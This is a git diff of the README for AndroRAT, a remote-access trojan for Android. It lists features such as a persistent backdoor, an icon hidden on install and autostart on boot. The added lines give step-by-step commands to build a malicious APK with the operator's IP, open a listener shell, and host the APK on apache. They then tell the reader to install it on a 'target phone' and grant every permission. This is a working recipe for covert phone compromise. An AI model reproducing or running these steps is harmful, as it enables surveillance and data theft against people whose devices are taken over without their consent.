@@ -11,12 +11,8 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 > AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
 
-## Screenshots
-
-![AndroRAT](Screenshots/5.jpg "AndroRAT in action")
 ## Features of AndroRAT 
 * Full persistent backdoor
-* ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~
 * Invisible icon on install
 * Light weight apk which runs 24*7 in background
 * App starts automatically on boot up 
@@ -115,40 +111,22 @@ In the sh shell there are some sub commands
     put [filename]              --> uploads the file to the android device
 ```
 
-## Examples
 
-* To build the apk using ngrok which will also set the listner:
-```python3 androRAT.py --build --ngrok -o evil.apk```
-
-* To build the apk using desired ip and port:
-```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
-
-* To get the interpreter:
-```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
-
-## Interpreter Examples
-* Generating APK
-<p align="center">
-  <img src="Screenshots/6.JPG" width="800"/>
-</p>
 ------------------------------------------------------------------------------------------------------------------------------  
 
-* Some interpreter Commands 
-<p align="center">
-  <img src="Screenshots/1.JPG" width="800"/>
-</p>
-------------------------------------------------------------------------------------------------------------------------------
 
-## Supporters:
-[![rayep](https://avatars.githubusercontent.com/u/40718616?v=4&s=60)](https://github.com/rayep)
+## Commands From Starting - Examples
+git clone https://github.com/karma9874/AndroRAT.git
+cd AndroRAT
+pip install -r requirements.txt
+cat requirements.txt
+python3 androRAT.py --build -i <YOUR IP ADDRESS> -p 4444 -o <FILE NAME>.apk
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
 
-## TODO
-* ~~Ngrok support~~
-* Set up multi client
-* Add screenshot command
+OPEN ANOTHER TERMINAL
 
+sudo systemctl status apache2.service
+sudo systemctl start apache2.service
+sudo cp <YOUR FILE NAME>.apk /var/www/html/
 
-## License
-AndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
-
-
+OPEN YOUR TARGET PHONE AND ENTER THE IP ADDRESS IN WHICH YOU ARE RUNNING THE PROGRAM. THEN, DOWNLOAD IT AND ENTER OEPN IN YOUR TARGET PHONE AND GIVE ACCESS TO WHATEVER THE APP ASKS> THEN> GO TO THE 1ST TRMINAL AND TYPE help AND YOU ARE GOOF TOP GO!
